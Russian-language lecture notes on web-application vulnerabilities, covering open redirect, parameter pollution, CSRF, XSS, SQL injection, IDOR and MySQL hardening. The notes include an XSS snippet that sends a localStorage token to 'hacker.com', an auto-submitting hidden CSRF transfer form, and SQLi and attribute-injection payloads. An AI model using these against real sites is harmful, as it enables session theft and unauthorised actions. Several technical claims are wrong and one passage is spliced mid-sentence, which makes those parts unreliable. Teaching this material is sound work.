---
title: "Лекция 4. Охота за уязвимостями в веб-приложениях"
meta: "lection-4"
metaTitle: "Охота за уязвимостями в веб-приложениях"
---

# Лекция 4. Уязвимости

## Уязвимость
>это слабое место в приложении, с помощью которого потенциальный злоумышленник, может выполнять нелегитимные действия или получить несанкционированных доступ к информации.

Уязвимости могут возникать в результате выполнения как не стандартных, так и непредвиденных действий, такие как изменения дификатора.

Представьте сайт, который предоставляет создать профиль с личными данными, доступные только вашим друзьям, добавление вас в друзья без вашего разрешения, будет являться уязвимостью.

**Как работает клиент-серверное приложение:**

1. Шаг 1. Извлечение доменного имени.
   После получения URL адреса, браузер вычленяет из него доменное имя, которое является идентификатором веб-сайта, который планируется открыть.

2. Шаг 2. Получение IP-адреса
   Определив доменное имя, браузер использует DNS, для получения IP - адреса, связанного с ним. Этот процесс называется расширением IP адреса. Сам запрос для сопоставления IP адреса и доменного имени серверам DNS, которые содержат реестр всех доменов и соответствующих их ip адресов.

3. Шаг 3. Установление ТСР-соединения
   Далее компьютер использует протокол управления передачей (Transmission Control Protocol, или TCP), чтобы установить соединение с IP-адресом на порту 80, так как в начале имени сайта указано http://.

4. Шаг 4. Отправка http запросов
   GET / HTTP/1.1
   Host: www.google.com
   Connection: keep-alive
   Accept: application/html, _/_
   User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36
   (KHTML, like Gecko) Chrome/72.0.3626.109 Safari/537.36

**HTTP/1.1 200 OK**
**Content-Type: text/html**

```html
<html>
  <head>
    <title>Google.com</title>
  </head>
  <body>
    --пропуск—
  </body>
</html>
```

Первая уязвимость на get запросах это **Open Redirect**. Уязвимость **open redirect** позволяет веб сайту передавать пользователю другой url адрес (возможно в другом домене, эксплуатирует доверие к домену, чтобы заманить жертву на вредоносный веб-сайт, сопровождаться атакой типа Фишинг, при которой пользователь может, что передаёт данные надёжному веб-сайту).

Типовые параметры для уязвимости Open Redirect: **redirect_to, domain_to, checkout_url, after_login**.

<hr>

::theTitle 
Охота за уязвимостями в веб-приложениях
::

## Засорение http параметров

**Parameter pollution(HPP)**, когда злоумышленник внедряет в http запрос дополнительные параметры и может проявиться как на серверных так и на клиентских частях.

Поиск подобной уязвимости связан с подобными экспериментами, и как сервер работает с http параметрами.

Отправив серверу запрос мы получаем ответ, если дополнить запрос неким кодом, сервер может его выполнить, но этот процесс останется от нас скрытым.

```php
<? $val=htmlspecialchars($_GET['par'],ENT_QUOTES); ?>

<a href="/page.php?action=view&par='.<?=$val?>.'">View Me!</a>
```

Злоумышленник с помощью параметра par, который вводит пользователь, передает значение 123%26 action=edit, чтобы сгенерировать
дополнительный параметр. Символ & в URL-кодировке превращается в %26 (при анализе URL-адреса %26 интерпретируется как &). Этот символ добавляет к сгенерированной ссылке
href параметр action. Символ & на месте %26 разделял бы параметры, и значение action было бы утеряно, поскольку сайт не отнес бы его к параметру par. Дальше par передается функции htmlspecialchars О, которая преобразует специальные символы в значения HTML-кодировки и превращает %26 в строку &amp; (означающую &). Преобразованное значение сохраняется в $val. Затем путем добавления $val в конец href в строке генерируется новая ссылка

```html
<a href="/page.php?action=view&par=123&amp;action=edit">.</a>
```

Таким образом, злоумышленник добавил action=edit к URL-адресу в href, что может стать причиной уязвимости в зависимости от того, как приложение обработает контрабандный параметр action.

Риск который представляет hpp зависит от действий выполняемых серверной стороной, и от того где применяются лишние параметры. Обнаружение уязвимости hpp требует тщательного тестирования, поскольку исходные коды и исполняемые файлы, которые используются сервером, после получения http запроса скрыт от пользователей и хакеров.

<hr>

## Межсайтовая подделка запросов (CSRF)

При межсайтовой подделке запросов, злоумышленник заставляет браузер жертвы посылать HTTP запрос другому сайту, чтобы тот выполнил действие исходя из доверия отправителю запроса. Обычно для этого нужно, чтобы жертва была аутентифицирована на другом атакуемом веб сайте. В случае успеха атаки злоумышленник получает возможность изменить информацию на серверной стороне или даже захватить учётную запись жертвы.

- 1 вектор - Аутентификация

Атаки пользуются слабыми местами в механизмах аутентификации запросов, включающие ввод имени пользователя и пароля, а также их сохранение с помощью протокола базовой HTTP аутентификации или в виде cockie.

Одним из методов борьбы с подобными атаками является ограничение возможности пользователя при помощи GET запросов, например: доступ только на чтение. Современные фреймворки для создания веб приложений уже включают защиту от этого вектора атак такие как Django, Fast Api.

```http
POST / HTTP/1.1
Host: www.google.ca
User-Agent: Mozilla/5.0 (Windows NT 6.1; rv:50.0) Gecko/20100101 Firefox/50.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,_/_;q=0.8
Content-Length: 5
Content-Type: text/plain; charset=UTF-8
Connection: close
```

Тип содержимого указывается в заголовке Content-Type, который браузер, включает свои запросы, заголовок содержит множество свойств. В данном случае вредоносный сайт может создать скрытую html форму отправить её без ведома жертвы.

```html
<iframe style="display:none" name="csrf-frame"></iframe>
<form
  method="POST"
  action=" http://bank.com/transfer "
  target="csrf-frame"
  id="csrf-form"
>
  <input type="hidden" name="from" value="Bob" />
  <input type="hidden" name="to" value="Joe" />
  <input type="hidden" name="amount" value="500" />
  <input type="submit" value="submit" />
</form>
<script>
  document.getElementById("csrf-form").submit();
</script>
```

Набор правила чтения документов называется совместным использованием ресурсов между разными источниками, CORS. CORS ограничивает доступ к ресурсам.

```html
<form method="POST" action=" http://bank.com/transfer ">
  <input type="text" name="from" value="Bob" />
  <input type="text" name="to" value="Joe" />
  <input type="text" name="amount" value="500" />
  <input
    type="hidden"
    name="csrf"
    value="lHt7DDDyUNKoHCC66BsPB8aN4p24hxNu6ZuJA+81+YA="
  />
  <input type="submit" value="submit" />
</form>
```

Имена токенов могут быть не очевидными: X-CSRF-TOKEN, lia-token,
rt, form-id. Их включают в http заголовки в тело post запроса.

Уязвимости CSRF допускают атаки, проводимые без ведома жертвы или ее активного участия. Поиск таких уязвимостей может потребовать изобретательности и готовности тестировать все функции сайта.

<hr>

## XSS - (cross site scripting)

Один из способов воровства информации, хранящийся на клиентской части, являются XSS атаками. Для реализации данного типа атак, злоумышленнику требуется базовое знание javascript, а так же место
Google www.google.ca
для закрепления передаваемого эксплойта. На первый взгляд js является языком для взаимодействия с DOM, а также из-за изоляции ядра Electron, на котором построены современный веб браузеры, не имеет доступ к клиентской машине, но для злоумышленника этого может быть достаточно.

С октября 2009 года данный тип уязвимости показал, что защита клиентской части приложения требует не меньшую чем серверную часть, т.к. может являться точкой входа в серверную часть.

Аналогично другим атакам которые были рассмотрены раннее, XSS возникает когда веб сайт выводи определённые веб символы без определённой обработки. **Среди символов, которые могут быть использованы для проведения XSS, можно выделить несколько знаков:**
- " " - quot
- ' ' - apos
- "<" - it
- ">" - gt
- &

Одним из классических методов выявления xss атак, является данный код:

```html
<script>
  alert("xss");
</script>

<div>
  <h4>echo $name</h4>
  <p>echo $text</p>
  <div>
    <script>
      let token = localStorage.getItem("token");
      fetch("http://hacker.com/${token}");
    </script>
  </div>
</div>
```

Однако XSS может и не являться уязвимостью. Например если вывести document.domain из изолированного iframe вредоносный код на js не получит доступ к cookie. В современных веб-браузерах реализован механизм безопасности под названием принцип одного источника(same origin policy), который ограничивает взаимодействие документов с ресурсами загруженными с одних источников.

**В некоторых ситуациях URL адрес не совпадает с источником, например схемы:**

1. about: blank
2. javascript:
   Наследует источник который их открывает.
   При обнаружении уязвимости XSS, в качестве демонстрации удобнее использовать данный alert: alert(document.domain).
   Он продолжает источник, в котором выполняется атака, даже если он отличается от url адреса показанного в браузере. Но не каждой странице с возможностью внедрения можно передавать html теги. Вредоносные данные также передают через одинарные или двойные кавычки. Степень серьёзности атаки к xss зависит от того, где происходит внедрение.
   <input type="text" name="username" value="hacker" width="50px" >
   hacker " onfocus=alert('xss') autofocus"
   Добавив в атрибут двойную кавычку, злоумышленник может закрыть существующую кавычку и внедрить в тег вредоносные данные xss.

```html
<input type="text" name="username" value="hacker" onfocus=alert('xss') autofocus
"" width="50px" />
```

### Виды XSS

Reflected XSS — Отражённый XSS, где вредоносный скрипт исходит из текущего HTTP-запроса
Stored XSS — Сохранённый XSS, где вредоносный тип берётся из базы данных сайта
DOM-based XSS — XSS на основе DOM, где уязвимость существует в коде на стороне клиента, а не в коде на стороне сервера

1. Хранимые или же постоянные, такие уязвимости возникают, когда злоумышленнику удаётся сохранить на севере. Такой вредоносный код активируется каждый раз когда клиент заходит на вредоносный сайт.
2. Отражённый, или не постоянный, является наиболее распространённым из xss атак, их смысл в том, что злоумышленник прячет вредоносный код в заранее подготовленные ссылки, который потом передаёт пользователю при помощи почтовой рассылки или же размещает на веб сайте. Чаще всего нацелены на cockie потенциальных жертв.
3. DOM Model, главной особенностью данной атаки является сама страница или веб приложение, которые остаются неизменными, но меняется её отображение из-за вредоносных модификаций DOM.

**XSS также различаются по типу активности:**

1. Активный
2. Пассивный

Заголовок в последствии XSS угрозу несут непосредственно XSS атаки, для которых "дырки" в системе защиты являются "точками входа".

**С помощью XSS атаки можно нанести пользователю вред:**

1. Кража пользовательских данных - похищение кофедентифицаильных данных пользователя: история посещений, история по платёжным данных, личные переписки, PDN - персональные данные и т.п.

SQLi (внедрение SQL)
Уязвимость, которая позволяет злоу 2. Использование аккаунта пользователя жертвы для рассылки спама угроз или другого противоправного контента. 3. Публикация комментариев с противозаконным или компрометирующим содержанием. 4. Рассылать вредоносные программы другим пользователям, особенно тем, у кого пользователь-жертва пользовался доверием. 5. Получить бесплатный доступ к платному контенту.

Получить авторизационные данные любого зарегистрированного пользователя, испортить интерфейс или функционал, с целью нанесения репутационных рисков. Разместить на ресурсе компрометирующий контент, внести изменения в содержание. Сломать корпоративную базу данных с целью получения коденфидициальной информации(секретные технологии, сведения о коммерческой деятельности, состояние счетов и т.д.).

<hr>

## SQLi (внедрение SQL)

Уязвимость, которая позволяет злоумышленнику обращаться к БД сайта и атаковать её с помощью языка структуированных запросов (SQL) называется SQLi (Injection). Благодаря этой уязвимости злоумышленник получает возможность изменить, извлечь или исказить информацию хранящуюся в БД, также существует риск создания новой учетной записи администратора.

```php
$name = $_GET[ ' name '];
$query = "SELECT \* FROM users WHERE name = '$name' ";
mysql_query ($query) ;

$query = "SELECT \* FROM users WHERE name = 'test' OR 1='1'";
```

Сайт ожидает, что name содержит обычный текст. Но если пользователь
передаст вредоносный код test' OR 1=\*1 в параметре URL-адреса, такого как
https://www.example.com?name=test' OR 1='1, БД выполнит следующий запрос:

mysqli_real_escape_string

один из способов защитистся от sqli использовать хранимые процедуры которые позволяют бд выполнять повторяющийся запрос
Так как базы данных используют запросы как шаблоны для подстановки переменных, необработанные данные не могут изменить запрос. Современные frameworks также предоставляют встроенную защиту SQL инъекций, но на сегодняшний день она не может избавиться от всех уязвимостей.
Типы SQL инъекций.

Традиционно принято выделять 3 вида инъекций-SQL: классическая SQL-Injection, слепая SQL-Injection и out-of-band-Injection (атака, осуществляемая только путем превышения емкости сокета, открытого между клиентом и сервером). Каждая из них делится на подтипы, также атаки при помощи SQL-инъекции бывают смешанные.

**SQL-Injection делят по способам эксплуатации:**

1. SQL injection union — атака производится при помощи использования SQL-оператора Union для объединения нескольких таблиц и получения данных из смежных таблиц (напрямую туда доступа нет).
2. SQL-injection boolean — называют слепой инъекцией. Здесь система управления базами данных не выдает как таковых ошибок, а запрос конструируется так, чтобы, например, наблюдать за задержкой выполнения вводимых команд. Информация извлекается исходя из реакции на условные выражения.
3. Слепая SQL-injection на основе булевых операций (или инференциальная SQL-инъекцией) – в параметр HTTP-запроса передаются несколько допустимых утверждений, результатом которых является true и false. Сравнивая страницу ответа между обоими условиями, атакующий может сделать вывод о том, была ли инъекция успешной или нет.
4. Временная слепая SQL-injection (иногда называют полной слепой SQL-injection) – в параметр HTTP-запроса передаются специальные SQL-запросы, которые заставляют базу данных приостановиться на определенный период времени. Сравнивая время отклика между обычными запросами и с различными временными интервалами, атакующий может определить, было ли выполнение SQL-запроса успешным.
5. SQL-injection error based — атака, нацеленная на получение ошибки от баз данных, чтобы атакующий смог сформировать представление об их архитектуре.

```sql
SELECT first_name, middle_name, last_name FROM Student
UNION
SELECT first_name, middle_name, last_name FROM Teacher
```

SQLi может быть серьезной уязвимостью, открывающей неограниченный доступ к данным. Она обостряется при сохранении в БД записей, предоставляющих полномочия администратора. Проверяйте участки, в которых может происходить передача в запрос неэкранированных одинарных или двойных кавычек. Признаки
существования проблемы могут быть не очевидными, как в случае со слепым внедрением. Ищите страницы, позволяющие передавать данные сайту неожиданными способами - например, подставлять массивы в качестве параметров запроса.

<hr>

## Удаленное выполнение кода

Уязвимость к удаленному выполнению кода «RCE», возникает когда приложение использует контролируемый пользователем ввод без предварительной обработки.
RCE обычно экспортируется либо по средствам команд оболочки либо путем выполнения функции в языке программирования на котором написано используемое веб-приложение. Как и многие другие уязвимости, RCE возникает в результате использования пользовательского ввода без надлежащей предварительной обработки. Чтобы найти эту уязвимость, Садегипур воссоздал ее на собственном сервере, Принс обнаружил секретный ключ для подделки подписанных куки, а Лэндри сохраненил собственные SSH-ключи.

<hr>

## Небезопасные прямые ссылки на объекты

Небезопасная прямая ссылка на объект (insecure direct object reference, или IDOR) позволяет злоумышленнику прочитать или изменить ссылку на ресурс (такой как файл, строка в БД, учетная запись и т. д.), доступа к которому у него быть не должно. Представьте, что на веб-сайте www.<example>.com есть приватные профили, которые должны быть доступны только их владельцам по URL-адресу вида www.<example>.com/user?id=1. Параметр id определяет, чей профиль вы просматриваете. Если для доступа к чужому профилю достаточно поменять параметр id на 2 — это пример уязвимости IDOR.

<hr>

## Поиск простых уязвимостей IDOR

В самом простом случае роль идентификатора играет обычное целое число, которое инкрементируется при создании новой записи. Для проверки таких уязвимостей достаточно вычесть 1 из параметра id и подтвердить, что вы получили несанкционированный доступ к информации.

### Поиск более сложных уязвимостей IDOR

Сложные уязвимости IDOR могут возникать, когда параметр id спрятан в теле POST-запроса или имеет имя, которое сложно распознать. Вы, наверное, уже сталкивались с тем, что в качестве идентификаторов используются не совсем очевидные параметры, такие как ref, user или column. Но даже если вам не удается сразу определить идентификатор по имени его параметра, обратите внимание на передаваемые значения. Если среди них есть целое число, попробуйте его изменить и посмотрите, как это повлияет на поведение сайта. С помощью Burp легче перехватить HTTP-запрос, поменять ID и воспроизвести его, используя инструмент Repeater.

Обнаружение уязвимостей IDOR осложняется тем, что некоторые сайты
используют случайные на вид идентификаторы, такие как
универсальный уникальный идентификатор (universal unique identifier, или UUID). UUID представляет собой алфавитно-цифровую строку длиной 36 символов, которая не соответствует какому-то определенному шаблону. На сайте, который применяет UUID, практически невозможно найти корректные записи путем
подбора случайных значений. Чтобы получить доступ к пользовательским профилям с идентификаторами UUID, создайте профиль пользователя А, а затем войдите на сайт от имени пользователя Б и попробуйте открыть профиль А, указав его UUID.

### Итоги

Уязвимости IDOR возникают в ситуациях, когда злоумышленник может прочитать или изменить ссылку на объект, который не должен быть ему доступен.
В простых случаях IDOR заключается в прибавлении или вычитании 1 из целых инкрементируемых чисел. В более сложных примерах с применением UUID или случайных идентификаторов, возможно, потребуется проверить платформу на предмет утечек. Это можно сделать, например, в JSON-ответах или HTML-содержимом, используя разные методы, такие как поиск Google и анализ URL-адресов. Всегда описывайте в отчетах самые опасные возможные атаки, так как от этого зависит размер вознаграждения.
<hr>

## Безопасность веб приложений на php

Чем больше проект, тем больше в нем ошибок, единственной возможной программой которая не имеет ошибок может быть лишь та программа, которая выводит текст и ничего более, например: "Hello World". Если в вашей программе нет ошибок, это значит что их нет сегодня.

Давайте рассмотрим пример защиты
MySQL и Apache в операционной системе Linux. Защиту самой ОС мы опустим, потому что это отдельная и очень большая тема.

**Итак, защита начинается с установки и предварительного конфигурирования. В случае с MySQL необходимо выполнить следующие действия:**

1. По умолчанию сервер базы данных устанавливается с настройками, при которых администраторский доступ разрешен пользователю root с «пустым» паролем. Это небезопасно. Необходимо как минимум установить сложный пароль, а также переименовать учетную запись root. Если вы работали с ОC Linux, то должны знать, что в этой системе администратор тоже работает под учетной записью root. Но имена администраторов в ОС и в базе данных никак не связаны и не должны быть одинаковыми.
2. Надо заблокировать анонимный доступ к базе данных. Подключения должны производиться только для авторизованных посетителей.
3. Необходимо удалить все базы данных, созданные для тестирования и отладки. По умолчанию в большинстве серверов баз данных устанавливается тестовая база данных. В работающей системе ее быть не должно.
4. Никогда не подключайтесь к базе данных из сценариев от имени администратора. Сценарии должны подключаться к базе от имени простого пользователя и, желательно, с минимальными правами доступа. Если таблица содержит неизменяемые данные, то нужно запретить пользователю выполнение оператора uPdaTe. Да, придется потратить время на настройку прав доступа, но без этого не обойтись.